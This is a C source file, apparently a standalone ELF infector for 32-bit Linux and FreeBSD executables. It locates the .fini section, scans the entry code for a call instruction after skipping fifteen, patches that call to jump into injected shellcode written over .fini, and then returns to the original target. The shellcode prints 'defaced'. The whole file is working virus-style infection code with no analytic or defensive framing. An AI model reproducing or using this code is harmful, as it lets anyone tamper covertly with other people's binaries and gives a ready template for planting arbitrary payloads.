#include <stdio.h>
#include <fcntl.h>
#include <elf.h>

struct x86_tbl_rec
{
    unsigned char op;
    unsigned char op2;
    unsigned char op3;
    unsigned int len:4;
};

#include "disasm.h"  // from ../neiro disassembler

#define CALL_SKIP     15     // skip first 15 call()'s

int fd;
Elf32_Ehdr h;

char shellcode[] =
"\x31\xc0\x6a\x01\x50\xcd\x80"  // exit() syscall
"\x55\x89\xe5"
"\x31\xc0\x68\x63\x65\x64\x0a\x68\x64\x65\x66\x61"
"\x89\xe3\x6a\x08\x53\x6a\x01\x6a\x04\x50\xcd\x80"
"\x89\xec\x5d\xe9";

unsigned char sig[] = "@(#) C";        // FreeBSD signature
unsigned char sig1[] = "\x83\xec\x04";     // Linux signature
unsigned char sig2[] = "\x5a\x5b\x5d\xc3";

#define SKIP2   0x10
#define BACK    0x07
#define BACK2   0x0a

int check_offs(int fd)
{
    unsigned char a;

    lseek(fd, SKIP2, 1);

    read(fd, &a, 1);
    if (a != sig2[0]) return 0;

    read(fd, &a, 1);
    if (a != sig2[1]) return 0;

    read(fd, &a, 1);
    if (a != sig2[2]) return 0;

    return 1;
}

int check_offs_bsd(int fd)
{
    unsigned int cnt;
    unsigned char a;

    lseek(fd, -7, 1);
    read(fd, &a, 1);

    for (cnt=0; cnt < 0xf000; cnt++)
    {
    if (a == 0xc3) break;
    lseek(fd, -2, 1);
    read(fd, &a, 1);
    }

    if (a != 0xc3) return 0;

    return 1;
}

/* find .fini via elf symbol section headers */
int get_fini_elf()
{
    int i;
    Elf32_Shdr sh;

    lseek(fd, h.e_shoff, 0);

    for (i=0; i < h.e_shnum; i++)
    {
    read(fd, &sh, sizeof(Elf32_Shdr));

    if (sh.sh_size == 0x06 || sh.sh_size == 0x1b)
        return sh.sh_offset;
    }

    return 0;
}

int get_fini_sig()
{
    int i, offs, os = 0;
    unsigned char a;

    // check for OS

    if (h.e_ident[7] == 0x03) os = 1;  // linux
    if (h.e_ident[7] == 0x09) os = 2;  // freebsd
    if (os == 0) return 0;

    i = offs = 0;

    // FreeBSD
    if (os == 2)
    {
    while( read(fd, &a, 1) == 1)
    {
        offs++;

        if (a == sig[i]) i++;
        else i = 0;

        if (i == 6) break;
    }

    if (i != 6 || !check_offs_bsd(fd)) return 0;
    offs -= BACK2;

    } else {

    while( read(fd, &a, 1) == 1)
    {
        offs++;

        if (a == sig1[i]) i++;
        else i = 0;

        if (i == 3)
        {
        if (check_offs(fd)) break;
        offs += 17;
        i = 0;
        }
    }

    if (i != 3) return 0;
    offs -= BACK;
    }

    return offs;
}

int main(int argc, char *argv[])
{
    int i, call_cnt = 0;
    unsigned int disp, o_addr, fini, addr, offs=0;
    unsigned char a,b;

    if (argc < 2)
    {
    printf("usage: %s <file>\n", argv[0]);
    return 0;
    }

    fd = open(argv[1], O_RDWR);
    read(fd, &h, sizeof(Elf32_Ehdr));

    if (h.e_entry < 0x8048010)
    {
    printf("[-] bad entry point, is it lib?\n");
    return 0;
    }

    printf("[+] get fini via ELF\n");
    fini = get_fini_elf();
    if (fini == 0)
    {
        printf("[+] nope, get fini via signature\n");
    fini = get_fini_sig();
    }

    if (fini == 0)
    {
    printf("[-] cant find .fini section\n");
    return 0;
    }

    printf("[+] fini = 0x%x (0x%x)\n", fini, fini+0x8048000);

    offs = h.e_entry - 0x8048000;
    lseek(fd, offs, 0);

    while( read(fd, &a, 1) == 1)
    {
    if (a == 0)
    {
        read(fd, &b, 1);
        if (b == 0) break;
        lseek(fd, -1, 1);
    }

    for (i=0; i < sizeof(opcode_lst)/sizeof(struct x86_tbl_rec); i++)
    {
        if (opcode_lst[i].op != a) continue;

        if (opcode_lst[i].op2 != 0)
        {
        read(fd, &b, 1);
        lseek(fd, -1, 1);

        if (opcode_lst[i].op2 != b) continue;
        }

        if (opcode_lst[i].op2 != 0 && opcode_lst[i].op3 != 0)
        {
        lseek(fd, 1, 1);
        read(fd, &b, 1);
        lseek(fd, -2, 1);

        if (opcode_lst[i].op3 != b) continue;
        }

        lseek(fd, opcode_lst[i].len-1, 1);

        if (opcode_lst[i].op == 0xe8)
        {
        if (call_cnt <= CALL_SKIP) call_cnt++;
        else i = sizeof(opcode_lst)/sizeof(struct x86_tbl_rec);
        }

        offs += opcode_lst[i].len-1;

        break;
    }

        offs++;

    if (i == sizeof(opcode_lst)/sizeof(struct x86_tbl_rec))
        break;
    }

    if (offs <= (h.e_entry - 0x8048000))
    {
    printf("[-] cant find call()'s\n");
        return 0;
    }

    printf("[+] got call() to infect (0x%x) (0x%x)\n",
    offs, offs+0x8048000);

    /* fixup call() instruction */

    lseek(fd, offs+1, 0);
    read(fd, &o_addr, 4);
    lseek(fd, -4, 1);
    addr = fini + 7 - offs - 5;
    write(fd, &addr, 4);

    lseek(fd, fini, 0);
    write(fd, &shellcode, sizeof(shellcode)-1);
    addr = offs + o_addr - (sizeof(shellcode)-2 + fini);
    write(fd, &addr, 4);

    close(fd);
    return 0;
}
